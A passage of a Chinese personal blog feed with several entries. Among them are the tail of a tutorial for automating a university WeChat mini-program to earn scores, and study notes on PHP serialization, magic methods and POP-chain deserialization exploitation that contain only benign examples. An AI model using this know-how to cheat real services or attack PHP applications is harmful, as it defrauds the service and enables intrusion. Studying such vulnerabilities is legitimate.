title="最后开始让代码跑起来"></a>最后开始让代码跑起来</h5><p>在主程序的这个位置粘贴刚刚复制的key并运行<br><img src="https://s2.loli.net/2023/01/07/tSf9DFdlPKWLBbs.png" alt="报错没有库的自己装"></p><h4 id="这就结束了？当然不！"><a href="#这就结束了？当然不！" class="headerlink" title="这就结束了？当然不！"></a>这就结束了？当然不！</h4><h5 id="接下来是移动端部分"><a href="#接下来是移动端部分" class="headerlink" title="接下来是移动端部分"></a>接下来是移动端部分</h5><p>1.打开<a href="https://pan.baidu.com/s/1ff-HmcwQSz8cHGqgpMJrcw">百度网盘</a>链接下载安装pydriod，提取码:de5q<br>2.打开保存在手机里的主程序文件并填入key<br>3.左栏Pip中选择INSTALL，分别输入requests,json,random,urllib,time并INSTALL<br>4.左栏Settings的Editor选项内打开Preserve files on exit<br>5.点击大大的黄色的运行按钮</p><p>注:<br>如果运行时发生错误请检查网络或尝试重启<br>如果出现名字不显示或者各种奇奇怪怪的bug但确确实实在运行，那么看着就好(正所谓能跑就行)<br>如果显示<strong>得分失败，重新开始匹配</strong>就多等一会，因为没有真人跟你匹配是不会得分的<br>本章内容只对该小程序进行分析，仅限学习研究使用，严禁进行其他非法行为！造成的后果本人不承担相关责任。<br>严禁任何人以任何形式传播此文章相关内容，否则本人不承担任何责任。</p><p><em><strong>最后感谢该校各位前辈的指导和帮助！！！</strong></em></p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p><strong>每个烟花都像是盲盒，不知道点燃升空之后会是什么颜色、什么形状、会持续多久。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h3&gt;&lt;p&gt;今天是广州某大学的wx小程序研究资料。&lt;br&gt;既然来了，那么话不多说，直接上教程&lt;br&gt;首先下载安装必备的应用&lt;br&gt;&lt;em</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>Midjourney</title>
    <link href="https://liu1272.github.io/2023/01/06/20220106/"/>
    <id>https://liu1272.github.io/2023/01/06/20220106/</id>
    <published>2023-01-06T03:34:00.000Z</published>
    <updated>2023-03-03T11:31:54.563Z</updated>
    
    <content type="html"><![CDATA[<h5 id="无聊玩了一下Midjourney，挺方便，功能也很强大"><a href="#无聊玩了一下Midjourney，挺方便，功能也很强大" class="headerlink" title="无聊玩了一下Midjourney，挺方便，功能也很强大"></a>无聊玩了一下Midjourney，挺方便，功能也很强大</h5><p><img src="https://s2.loli.net/2023/01/06/vBlOqfjzJATF2kG.png#pic_center" alt="荒星"><br><img src="https://s2.loli.net/2023/01/07/uTWD6a93ZHOlxLq.png#pic_center" alt="好像刀妹"><br><img src="https://s2.loli.net/2023/01/06/X1FeICpcr74lkL9.png#pic_center" alt="粉毛YYDS"></p><h5 id="最后放个邀请地址"><a href="#最后放个邀请地址" class="headerlink" title="最后放个邀请地址"></a>最后放个<a href="https://discord.com/invite/midjourney">邀请地址</a></h5>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;无聊玩了一下Midjourney，挺方便，功能也很强大&quot;&gt;&lt;a href=&quot;#无聊玩了一下Midjourney，挺方便，功能也很强大&quot; class=&quot;headerlink&quot; title=&quot;无聊玩了一下Midjourney，挺方便，功能也很强大&quot;&gt;&lt;/a&gt;无聊玩了一</summary>
      
    
    
    
    <category term="随笔" scheme="https://liu1272.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="随笔" scheme="https://liu1272.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>Hentai</title>
    <link href="https://liu1272.github.io/2023/01/05/20220105/"/>
    <id>https://liu1272.github.io/2023/01/05/20220105/</id>
    <published>2023-01-05T15:37:00.000Z</published>
    <updated>2023-03-04T17:40:27.230Z</updated>
    
    <content type="html"><![CDATA[<h5 id="能找到这里的都是Hentai"><a href="#能找到这里的都是Hentai" class="headerlink" title="能找到这里的都是Hentai"></a>能找到这里的都是<a href="https://track.mp3-malina.me/play-track/d33532303034b6303534368cb734823000/ff34543f34e2aa427c7b17347be4cc40/S3rl%20-%20Hentai.mp3">Hentai</a></h5>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;能找到这里的都是Hentai&quot;&gt;&lt;a href=&quot;#能找到这里的都是Hentai&quot; class=&quot;headerlink&quot; title=&quot;能找到这里的都是Hentai&quot;&gt;&lt;/a&gt;能找到这里的都是&lt;a href=&quot;https://track.mp3-malina.me</summary>
      
    
    
    
    <category term="资源" scheme="https://liu1272.github.io/categories/%E8%B5%84%E6%BA%90/"/>
    
    
    <category term="资源" scheme="https://liu1272.github.io/tags/%E8%B5%84%E6%BA%90/"/>
    
  </entry>
  
  <entry>
    <title>图床及其相关</title>
    <link href="https://liu1272.github.io/2023/01/04/20220104/"/>
    <id>https://liu1272.github.io/2023/01/04/20220104/</id>
    <published>2023-01-04T10:12:00.000Z</published>
    <updated>2023-03-03T11:32:35.191Z</updated>
    
    <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h5 id="图床的创建"><a href="#图床的创建" class="headerlink" title="图床的创建"></a>图床的创建</h5><p>市面上免费的图床有SM.MS&emsp;Sibnet&emsp; Shutterfly<br>不完全免费的也有腾讯云&emsp; 阿里云&emsp; 七牛云<br>这里我把阿里云和SM.MS都试了一下</p><p>创建的话就跟着下面的步骤走就行了:<br>一.阿里云<br>&emsp;1.打开<a href="https://www.aliyun.com/?spm=5176.8466032.top-nav.dlogo.27b81450NiIk8F">官网</a>点击右上角进行注册/登录<br>&emsp;2.实名认证<br>&emsp;3.在左上角折叠页面里选择对象存储OSS<br>&emsp;4.右侧Bucket管理板块点击添加Bucket<br>&emsp;5.名称填写Bucket的名字，读写权限更改为公共读，其他的默认即可<br>&emsp;6.创建完成之后鼠标移至右上角头像上，选择AccessKey管理<br>&emsp;7.查看Secret并分别复制两行ID<br>&emsp;8.前往<a href="https://github.com/Molunerfinn/PicGo/releases">PicGo下载页面</a>选择对应版本下载安装<br>&emsp;9.打开PicGo图床设置的阿里云页面填写相关资料<br>&emsp;10.上传区选择格式就能使用了<br>二.SM.MS<br>&emsp;1.<a href="https://smms.app/">官网注册/登录</a><br>&emsp;2.复制<a href="https://smms.app/home/apitoken">此页面</a>的Secret Token<br>&emsp;3.在<a href="https://smms.app/">此页面</a>上传文件<br>&emsp;4.打开PicGo的SM.MS页面粘贴Secret Token<br>&emsp;5.上传区选择格式就能使用了</p><p>注:<br>1.我在使用PicGo链接SM.MS时总是失败，不知道为啥<br>2.因为阿里云不是免费的，想省钱可以选择香港<br>3.一定要设置<a href="https://help.aliyun.com/document_detail/31869.html?spm=5176.8466032.bucket.28.27b81450rEXDcJ">防盗链</a></p><h5 id="图床在markdown中的使用"><a href="#图床在markdown中的使用" class="headerlink" title="图床在markdown中的使用"></a>图床在markdown中的使用</h5><p>方法一:使用img标签</p><pre><code> &lt;img src=&quot;图片地址&quot;&gt;</code></pre><p>方法二:md语法</p><pre><code> ![图片简介](图片地址)</code></pre><h5 id="更改图片参数"><a href="#更改图片参数" class="headerlink" title="更改图片参数"></a>更改图片参数</h5><pre><code>使用html更改位置&lt;center&gt;&lt;img src=&quot;地址&quot;&gt;&lt;/center&gt;居中对齐操作：#pic_center向左对齐操作：#pic_left向右对齐操作：#pic_right想调整图片的尺寸就在上面这个指令后面加上=200x200(=200x宽高自适应)width=&quot;100&quot;调整大小</code></pre><p>今天的内容就这么多，下次有空再继续写。</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p><strong>眼下的生活，不是没有快乐。只是所有快乐都暗含着一层谨慎的底色。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h3&gt;&lt;h5 id=&quot;图床的创建&quot;&gt;&lt;a href=&quot;#图床的创建&quot; class=&quot;headerlink&quot; title=&quot;图床的创建&quot;&gt;</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>2022年度总结</title>
    <link href="https://liu1272.github.io/2022/12/31/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    <id>https://liu1272.github.io/2022/12/31/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</id>
    <published>2022-12-31T11:46:00.000Z</published>
    <updated>2023-01-04T11:28:04.788Z</updated>
    
    <content type="html"><![CDATA[<h4 id="呆"><a href="#呆" class="headerlink" title="呆~"></a>呆~</h4><p>  简直突如其来呐。<br>  万万没想到一个月就过去了，时间过得真快啊。</p><p>  在2022年的抗疫决赛圈，几乎所有人都成了小阳人，其中也包括我。<br>  发烧第一天真的是给我吓到了，中午一觉起来高烧42.5℃，惊恐之余赶紧撑着摇摇欲坠的身体去买布洛芬(似乎我这个城市退烧药还算充足？)到晚上睡前才降到39℃。看到那个长度我真的是笑希了，感觉39℃也不过是小问题……<br>  (⁄ ⁄•⁄ω⁄•⁄ ⁄)<br>  感谢芙灵和一个现在被迫带烧返校的可怜的江苏高三Dog!<br>  现在病情已经到了欲说还休的阶段了，因此被鹅鸭杀劝退<del>，因此才能闲到来写这个文章</del><br>  希望早日康复吧，我还想吃正新鸡排</p><p>  这个小小站点活过了第一个国庆，第一个圣诞，马上就是元旦和春节了，希望这里能永远保存下去。<br>  最近了解了GitHub Arctic Code Vault这个东东，虽然说想得到这个可能有点不现实，但是可以把它当作理想吧。<br>  (づ ●─● )づ</p><p>  对于2023年的规划没有太多的变化，仍然是多学习，多看世界，多保重身体。<br>  人生刚刚开始，未来可期。<br>  犹豫不决的时候不要问别人，问自己。听别人的如果后悔了，是要后悔两次的。</p><p>  最后，元旦快乐~</p><p>  乾杯 []~ （￣▽￣） ~*</p><h5 id="20230104补档"><a href="#20230104补档" class="headerlink" title="20230104补档"></a>20230104补档</h5><p>  <strong>试验阿里云+PicGo图床</strong><br>   <img src="https://liuguobin-blog.oss-cn-hongkong.aliyuncs.com/base.png#pic_center" width="300"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;呆&quot;&gt;&lt;a href=&quot;#呆&quot; class=&quot;headerlink&quot; title=&quot;呆~&quot;&gt;&lt;/a&gt;呆~&lt;/h4&gt;&lt;p&gt;  简直突如其来呐。&lt;br&gt;  万万没想到一个月就过去了，时间过得真快啊。&lt;/p&gt;
&lt;p&gt;  在2022年的抗疫决赛圈，几乎所有人都成了小阳人，</summary>
      
    
    
    
    <category term="随笔" scheme="https://liu1272.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="随笔" scheme="https://liu1272.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>PHP序列化及常见魔术方法</title>
    <link href="https://liu1272.github.io/2022/12/04/20221204/"/>
    <id>https://liu1272.github.io/2022/12/04/20221204/</id>
    <published>2022-12-04T13:59:00.000Z</published>
    <updated>2023-03-03T11:33:39.458Z</updated>
    
    <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><pre><code>【数组序列化】&lt;?php$a=null;echo serialize($a);?&gt;a:参数数量:&#123;i:0;s:字符串长度:&quot;字符串&quot;;&#125;$a=null;         N;$b=123456;       i:123456;$c=1.2;          d:1.2;$d=true;         b:1;$e=false;        b:0;$f=&#39;benben&#39;;     s:长度:字符串;【对象序列化】&lt;?phpclass lei&#123;    public $chengyuan=&#39;zifuchuan&#39;;    function hanshu()&#123;        echo $this-&gt;chengyuan;    &#125;&#125;$a=new lei();echo serialize($a);echo urlencode(serialize($a));?&gt;O:类名长度:&quot;类名&quot;:1:&#123;s:成员长度:&quot;成员名&quot;;s:值长度:&quot;值&quot;;&#125;修饰符public公有，private私有私有的成员属性要在前后都加上二进制的%00,在urlencode时可以看见【对象序列化的嵌套】&lt;?phpclass test&#123;    public $pub=&#39;benben&#39;;    function jineng()&#123;        echo $this-&gt;pub;    &#125;&#125;class test2&#123;    var $ben;&#125;$b=new test();$a=new test2();$a-&gt;ben=$b;echo serialize($a);?&gt;O:5:&quot;test2&quot;:1:&#123;s:3:&quot;ben&quot;;O:4:&quot;test&quot;:1:&#123;s:3:&quot;pub&quot;;s:6:&quot;benben&quot;;&#125;&#125;当在对象内调用对象时，会出现嵌套:实例化后的对象$a的成员变量&#39;ben&#39;调用实例化后的对象$b</code></pre><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>1.反序列化后的内容为一个对象，与序列化相反<br>2.反序列化生成的对象内的值，由反序列化里的值提供，与原有类预定义的值无关<br>3.反序列化不触发类的成员方法，需要调用方法之后才能触发</p><pre><code>&lt;?phpclass test&#123;    public $a=&#39;benben&#39;;    protected $b=666;    private $c=false;    public function displayVar()&#123;        echo $this-&gt;a;    &#125;&#125;$d=new test();$d=serialize($d);echo urlencode($d);$a=urlencode($d);$b=unserialize(urldecode($a));$b-&gt;displayVar();var_dump($b);?&gt;benbenobject(test)#1 (3) &#123;  [&quot;a&quot;]=&gt;  string(6) &quot;benben&quot;  [&quot;b&quot;:protected]=&gt;  int(666)  [&quot;c&quot;:&quot;test&quot;:private]=&gt;  bool(false)&#125;</code></pre><h4 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h4><p>概念:<br>预定好的，在特定的情况下处罚的行为方法。<br>反序列化成因(作用):<br>反序列化过程中unserizlize()接收的值(字符串)可控；<br>通过更改这个值(字符串)，所得到的代码；<br>通过调用方法，触发代码执行。<br>相关机制:<br>触发时机(先决条件)-&gt;功能(最重要)-&gt;参数(尤其是pop链)-&gt;返回值<br>详解:</p><pre><code>1.__construct()构造函数在实例化对象时，自动执行的方法只有当new时触发，不需要特地调用2.__destruct()析构函数在对象的所有引用都被删除或者对象被显式销毁时才触发new和unserialize之后会触发3.__sleep()清理对象可以传入成员属性，serialize之前触发并返回一个包含对象中所有需要被序列化的变量名称的数组如果无返回则NULL被序列化，产生E_NOTICE错误4.__wakeup()预先准备对象资源，返回void在unserialize前触发5.__tostring()表达方式错误把对象当成字符串调用时触发，如echo，print6.__invoke()格式表达错误把对象当成函数调用时触发，如echo $a() -&gt; hanshu7.__call()不存在方法不存在调用的方法时触发8.__callStatic()不存在方法静态调用或调用成员常量不存在时使用9.__get()不存在方法检查成员属性是否存在10.__set()不存在方法给不存在的成员属性赋值时触发11.__isset()或__empty()或__unset()不可访问对不可访问的属性访问时会触发如protect属性(不可读)或根本不存在的属性12.__clone()复制使用clone关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法__clone()</code></pre><p>注意:<br>1.只有该类或对象包含了该魔术方法才能被使用或触发<br>2.先分析尾部代码看看有什么执行的步骤<br>3.接着从触发的方法及其顺序判断漏洞的利用地点<br>4.最后构造playload<br>5.比较长的代码建议使用反推法进行分析<br>6.一定要先实例化(new)</p><h4 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h4><p>反序列化中成员变量可以被控制，使用有一种漏洞叫面向属性编程(POP)<br>POP链是利用魔术方法在里面多次跳转然后获取敏感信息的一种playload</p><h4 id="POC编写"><a href="#POC编写" class="headerlink" title="POC编写"></a>POC编写</h4><p>概念验证(POC)是漏洞验证程序，只是为了证明提出者观点的一段代码</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h3&gt;&lt;h4 id=&quot;序列化&quot;&gt;&lt;a href=&quot;#序列化&quot; class=&quot;headerlink&quot; title=&quot;序列化&quot;&gt;&lt;/a&gt;序列</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
</feed>
